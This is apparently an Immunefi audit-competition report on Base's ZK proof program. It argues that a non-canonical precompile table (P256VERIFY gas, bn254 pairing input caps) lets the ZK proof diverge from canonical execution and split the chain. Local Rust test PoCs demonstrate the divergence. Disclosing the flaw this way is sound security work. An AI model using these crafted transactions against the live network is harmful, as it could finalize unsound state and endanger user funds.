# 75363 bc medium zk proof program uses a non canonical precompile table breaking soundness across every base hardfork and enabling permanent chain split

**Submitted on Apr 28th 2026 at 18:07:49 UTC by @oxeix for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75363
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Unintended chain split (network partition)

## Description

### Brief/Intro

The SP1/ZKVM proof program used by Base's ZK proving service runs EVM execution against OpZkvmPrecompiles, a precompile provider whose table diverges from the canonical Base precompile table (BasePrecompiles) on every hardfork from Fjord onward, and additionally activates pre-Fjord precompiles that do not exist on chain. Because this provider is wired into ZkvmOpEvmFactory, which is the executor backend of the production SP1 program, an attacker can craft a transaction whose execution outcome (success/revert, gas used, return data) differs between an honest Base node and the generated ZK proof. Once submitted on L1, the unsound ZK proof finalizes a state that no honest L2 node can reproduce - producing a permanent chain split.

### Vulnerability Details

<https://github.com/base/base/blob/v0.8.0-rc.28/crates/succinct/utils/client/src/precompiles/mod.rs#L66-75>

```rust
fn get_precompiles() -> Vec<PrecompileWithAddress> {
    vec![
        bn254::add::ISTANBUL,
        bn254::mul::ISTANBUL,
        bn254::pair::ISTANBUL,        // pre-Granite, no input-size cap
        secp256k1::ECRECOVER,
        secp256r1::P256VERIFY,        // pre-Osaka pricing, RIP-7212 only
        kzg_point_evaluation::POINT_EVALUATION,
    ]
```

<https://github.com/base/base/blob/v0.8.0-rc.28/crates/succinct/utils/client/src/precompiles/mod.rs#L100>

```rust
// inside new_with_spec(spec):
let base = match spec { /* spec-correct table from BasePrecompiles */ };
let mut precompiles = base;
precompiles.extend(get_precompiles());        // <- unconditional override
```

The extend call is keyed by precompile address, so any precompile in get\_precompiles() whose address collides with one in base overrides the spec-correct variant.

Concrete divergences:

* **AZUL**
  * Precompile: 0x100 P256VERIFY
  * Canonical: secp256r1::P256VERIFY\_OSAKA (EIP-7951, base gas 6 900)
  * ZK (OpZkEVMPrecompiles) secp256r1::P256VERIFY (RIP-7212, base gas 3 450)
  * Observable difference: At 5 000 gas: canonical OutOfGas, ZK Ok(gas\_used=3450)
* **GRANITE, HOLOCENE**
  * Precompile: 0x08 bn254 pair
  * Canonical: bn254\_pair::GRANITE (rejects input > 112 687 B with Bn254PairLength)
  * ZK: bn254::pair::ISTANBUL (no cap)
  * Observable difference: At 112 704 B input: canonical Bn254PairLength, ZK Ok(0x…01)
* **JOVIAN, AZUL**
  * Precompile: 0x08 bn254 pair (and bls12\_381 G1/G2/Pairing)
  * Canonical: bn254\_pair::JOVIAN (rejects > 81 984 B) plus bls12\_381 Jovian caps
  * ZK: Base built from Self::isthmus() (line 102 in mod.rs), then overridden with Istanbul pair
  * Observable difference: At 82 176 B input: canonical Bn254PairLength, ZK Ok(0x…01)
* **BEDROCK, REGOLITH, CANYON, ECOTONE**
  * Precompile: 0x100 P256VERIFY
  * Canonical: precompile not present (RIP-7212 not yet active)
  * ZK: precompile present
  * Observable difference: A CALL to 0x100: canonical = empty-EOA call, ZK = P256 verifier

The ZK proof's contract with L1 is: "this output state is the result of applying canonical Base STF to the input state and the supplied transactions." The dispute game's resolution function on L1 trusts SP1 verifier output for state finalization. If the ZK program's EVM disagrees with canonical Base on any precompile observable, that contract is broken: a proposer can produce a valid SP1 proof for an output state that no honest Base node could ever reach, and the L1 game will accept it.

### Impact Details

This is a soundness break in the proof program resulting in an unintended permanent chain split requiring hard fork (Critical). Every Base fullnode runs canonical `BasePrecompiles`. The L1-finalized state from the ZK game runs `OpZkvmPrecompiles`. The first time a transaction touches any of the four divergent surfaces above (e.g., a pre-Osaka-priced P256 call cheap enough to land on L2 but too expensive on canonical Azul), the L1 truth and the L2 truth diverge. Recovery requires re-rolling the SP1 program and the L1 game's verifier key - a hard-fork-equivalent migration. Both branches' history must then be reconciled by social fork.

### References

<https://github.com/base/base/blob/v0.8.0-rc.28/crates/succinct/utils/client/src/precompiles/mod.rs>

## Proof of Concept

The following tests demonstrate the chain split at transaction level. All are needed to be pasted into `crates/proof/succinct/utils/client/src/precompiles/mod.rs`:

Note that case3 (Jovian bn254) is skipped as it's same precompile, same input-length error, same return value as Case 2.

### PoC #1 — AZUL P256VERIFY gas pricing

```rust
  /// Chain-split PoC #1 — AZUL: P256VERIFY gas pricing.
    ///
    /// Same construction as PoC #2 but exercising `0x100` (P256VERIFY) under AZUL,
    /// where the canonical chain charges 6 900 gas (`P256VERIFY_OSAKA`, EIP-7951)
    /// while the ZK provider unconditionally extends the pre-Osaka 3 450-gas variant.
    /// We pick a `gas_limit` between the two thresholds so the same tx is OOG on chain
    /// but successful in the proof.
    ///
    /// This is the headline hardfork divergence for the *Base Azul* audit comp.
    #[test]
    fn poc_chain_split_at_tx_level_azul_p256_pricing() {
        use alloy_evm::{EvmEnv, EvmFactory};
        use alloy_primitives::Address as AlloyAddress;
        use base_common_evm::{BaseEvmFactory, BaseTransaction, OpSpecId as Spec};
        use revm::{
            ExecuteEvm,
            context::{BlockEnv, CfgEnv, TxEnv},
            context_interface::result::ExecutionResult,
            database::EmptyDB,
            primitives::{Bytes as RevmBytes, TxKind, U256},
        };

        use crate::precompiles::factory::ZkvmOpEvmFactory;

        // P256VERIFY input: 160 zero bytes (msg_hash || r || s || x || y), all zero —
        // verification fails but the precompile still charges full base gas.
        let input_len: usize = 160;
        // intrinsic gas for 160 zero bytes = 21_000 + 160*4 = 21_640
        // canonical Azul precompile gas = 6_900  → total min 28_540
        // ZK Azul precompile gas       = 3_450  → total min 25_090
        // Pick gas_limit = 26_000  →  OOG on chain, succeeds in the proof.
        const TX_GAS_LIMIT: u64 = 26_000;

        let p256_addr: AlloyAddress = *secp256r1::P256VERIFY.address();

        let build_tx = || -> BaseTransaction<TxEnv> {
            BaseTransaction::builder()
                .base(
                    TxEnv::builder()
                        .caller(AlloyAddress::repeat_byte(0x42))
                        .kind(TxKind::Call(p256_addr))
                        .data(RevmBytes::from(vec![0u8; input_len]))
                        .gas_limit(TX_GAS_LIMIT)
                        .gas_price(0)
                        .value(U256::ZERO)
                        .nonce(0)
                        .chain_id(Some(1)),
                )
                .enveloped_tx(Some(RevmBytes::from_static(b"FACADE")))
                .build_fill()
        };

        let mut block_env = BlockEnv::default();
        block_env.gas_limit = 60_000_000;
        let cfg = CfgEnv::new_with_spec(Spec::AZUL);
        let env = EvmEnv::new(cfg, block_env);

        let mut canonical_evm =
            BaseEvmFactory::default().create_evm(EmptyDB::default(), env.clone());
        let canonical_result =
            canonical_evm.transact_one(build_tx()).expect("canonical tx must not error");

        let mut zk_evm = ZkvmOpEvmFactory::default().create_evm(EmptyDB::default(), env);
        let zk_result = zk_evm.transact_one(build_tx()).expect("zk tx must not error");

        println!(
            "[chain-split PoC #1] AZUL P256VERIFY @ gas_limit={TX_GAS_LIMIT}\n  \
             canonical:\n  {canonical_result:#?}\n[chain-split PoC #1] zk:\n  {zk_result:#?}",
        );

        let canonical_success =
            matches!(canonical_result, ExecutionResult::Success { .. });
        let zk_success = matches!(zk_result, ExecutionResult::Success { .. });

        assert!(
            !canonical_success,
            "canonical Azul P256 must NOT succeed at {TX_GAS_LIMIT} gas (Osaka 6900 base \
             + 21640 intrinsic = 28540 > {TX_GAS_LIMIT}). Got {canonical_result:?}"
        );
        assert!(
            zk_success,
            "ZK Azul P256 MUST succeed at {TX_GAS_LIMIT} gas (pre-Osaka 3450 base + 21640 \
             intrinsic = 25090 < {TX_GAS_LIMIT}) — that IS the bug. Got {zk_result:?}"
        );
        assert_ne!(
            canonical_success, zk_success,
            "BUG (chain split): canonical and ZK EVMs disagree on tx success bit \
             — different receipts, different state root, different block hash."
        );
    }
```

### PoC #2 — GRANITE, HOLOCENE

```rust
 #[test]
    fn poc_chain_split_at_tx_level() {
        use alloy_evm::{EvmEnv, EvmFactory};
        use alloy_primitives::Address as AlloyAddress;
        use base_common_evm::{BaseEvmFactory, BaseTransaction, OpSpecId as Spec};
        use revm::{
            ExecuteEvm,
            context::{BlockEnv, CfgEnv, TxEnv},
            context_interface::result::ExecutionResult,
            database::EmptyDB,
            primitives::{Bytes as RevmBytes, TxKind, U256},
        };

        use crate::precompiles::factory::ZkvmOpEvmFactory;

        // Tx: CALL 0x08 with 112 704 zero bytes (multiple of 192, > GRANITE cap).
        const PAIR_ELEM: usize = 192;
        let len =
            ((base_common_evm::GRANITE_MAX_INPUT_SIZE / PAIR_ELEM) + 1) * PAIR_ELEM;
        assert_eq!(len, 112_704);

        let build_tx = || -> BaseTransaction<TxEnv> {
            BaseTransaction::builder()
                .base(
                    TxEnv::builder()
                        .caller(AlloyAddress::repeat_byte(0x42))
                        .kind(TxKind::Call(bn254::pair::ADDRESS))
                        .data(RevmBytes::from(vec![0u8; len]))
                        .gas_limit(30_000_000)
                        .gas_price(0)
                        .value(U256::ZERO)
                        .nonce(0)
                        .chain_id(Some(1)),
                )
                .enveloped_tx(Some(RevmBytes::from_static(b"FACADE")))
                .build_fill()
        };

        let mut block_env = BlockEnv::default();
        block_env.gas_limit = 60_000_000;
        let cfg = CfgEnv::new_with_spec(Spec::GRANITE);
        let env = EvmEnv::new(cfg, block_env);

        // Canonical Base.
        let mut canonical_evm =
            BaseEvmFactory::default().create_evm(EmptyDB::default(), env.clone());
        let canonical_result =
            canonical_evm.transact_one(build_tx()).expect("canonical tx must not error");

        // SP1 / ZK backend.
        let mut zk_evm = ZkvmOpEvmFactory::default().create_evm(EmptyDB::default(), env);
        let zk_result = zk_evm.transact_one(build_tx()).expect("zk tx must not error");

        // The smoking gun: same tx, different outcomes.
        let canonical_success =
            matches!(canonical_result, ExecutionResult::Success { .. });
        let zk_success = matches!(zk_result, ExecutionResult::Success { .. });

        println!(
            "[chain-split PoC] canonical:\n  {canonical_result:#?}\n[chain-split PoC] zk:\n  {zk_result:#?}",
        );

        assert!(
            !canonical_success,
            "canonical Granite must NOT succeed on 112704-byte bn254 pair input; \
             the canonical chain rejects with Bn254PairLength. Got {canonical_result:?}"
        );
        assert!(
            zk_success,
            "ZK Granite MUST succeed (that IS the bug). Got {zk_result:?}"
        );
        assert_ne!(
            canonical_success, zk_success,
            "BUG (chain split): canonical Base node and SP1 ZK program disagree on the \
             SAME transaction's success bit. Receipt root, state root, and block hash \
             of any block containing this tx therefore diverge between canonical \
             execution and the SP1 proof — a permanent chain split."
        );

        // Strengthen: ZK return data is the bn254-pair "success" byte (one trailing 0x01).
        if let ExecutionResult::Success { output, .. } = &zk_result {
            let bytes = output.data();
            assert_eq!(bytes.len(), 32, "bn254 pair returns 32 bytes");
            assert_eq!(bytes[31], 1, "bn254 pair returns 0x...01 on success");
            println!(
                "[chain-split PoC #2] ZK proves pairing(112704 zero bytes) = 0x...01 — \
                 a withdrawal-gating contract that branches on this return value would \
                 release funds in the proof but not on chain.",
            );
        }
    }
```

### PoC #4 — BEDROCK P256 chain split

```rust
#[test]
    fn poc_chain_split_at_tx_level_bedrock_p256_existence() {
        use alloy_evm::{EvmEnv, EvmFactory};
        use alloy_primitives::Address as AlloyAddress;
        use base_common_evm::{BaseEvmFactory, BaseTransaction, OpSpecId as Spec};
        use revm::{
            ExecuteEvm,
            context::{BlockEnv, CfgEnv, TxEnv},
            context_interface::result::ExecutionResult,
            database::EmptyDB,
            primitives::{Bytes as RevmBytes, TxKind, U256},
        };

        use crate::precompiles::factory::ZkvmOpEvmFactory;

        let input_len: usize = 160;
        const TX_GAS_LIMIT: u64 = 100_000;

        let p256_addr: AlloyAddress = *secp256r1::P256VERIFY.address();

        let build_tx = || -> BaseTransaction<TxEnv> {
            BaseTransaction::builder()
                .base(
                    TxEnv::builder()
                        .caller(AlloyAddress::repeat_byte(0x42))
                        .kind(TxKind::Call(p256_addr))
                        .data(RevmBytes::from(vec![0u8; input_len]))
                        .gas_limit(TX_GAS_LIMIT)
                        .gas_price(0)
                        .value(U256::ZERO)
                        .nonce(0)
                        .chain_id(Some(1)),
                )
                .enveloped_tx(Some(RevmBytes::from_static(b"FACADE")))
                .build_fill()
        };

        let mut block_env = BlockEnv::default();
        block_env.gas_limit = 60_000_000;
        let cfg = CfgEnv::new_with_spec(Spec::BEDROCK);
        let env = EvmEnv::new(cfg, block_env);

        let mut canonical_evm =
            BaseEvmFactory::default().create_evm(EmptyDB::default(), env.clone());
        let canonical_result =
            canonical_evm.transact_one(build_tx()).expect("canonical tx must not error");

        let mut zk_evm = ZkvmOpEvmFactory::default().create_evm(EmptyDB::default(), env);
        let zk_result = zk_evm.transact_one(build_tx()).expect("zk tx must not error");

        println!(
            "[chain-split PoC #4] BEDROCK CALL 0x100 (P256VERIFY)\n  \
             canonical:\n  {canonical_result:#?}\n[chain-split PoC #4] zk:\n  {zk_result:#?}",
        );

        let canonical_gas = match &canonical_result {
            ExecutionResult::Success { gas_used, .. } => *gas_used,
            ExecutionResult::Halt { gas_used, .. } => *gas_used,
            ExecutionResult::Revert { gas_used, .. } => *gas_used,
        };
        let zk_gas = match &zk_result {
            ExecutionResult::Success { gas_used, .. } => *gas_used,
            ExecutionResult::Halt { gas_used, .. } => *gas_used,
            ExecutionResult::Revert { gas_used, .. } => *gas_used,
        };

        assert_ne!(
            canonical_gas, zk_gas,
            "BUG (chain split): same tx burns different gas on canonical vs ZK BEDROCK \
             ({canonical_gas} vs {zk_gas}). Different `gasUsed` ⇒ different receipts \
             root ⇒ different block hash."
        );

        // Strengthen: on canonical BEDROCK the call is to an empty EOA so output is empty;
        // on ZK BEDROCK the P256 verifier returns 32 bytes (zero, since input is invalid,
        // but the *length* is still observable in the receipt).
        match (&canonical_result, &zk_result) {
            (
                ExecutionResult::Success { output: c_out, .. },
                ExecutionResult::Success { output: z_out, .. },
            ) => {
                println!(
                    "[chain-split PoC #4] return-data lengths: canonical={}, zk={}",
                    c_out.data().len(),
                    z_out.data().len()
                );
            }
            other => println!("[chain-split PoC #4] non-Success outcomes: {other:#?}"),
        }
    }
```
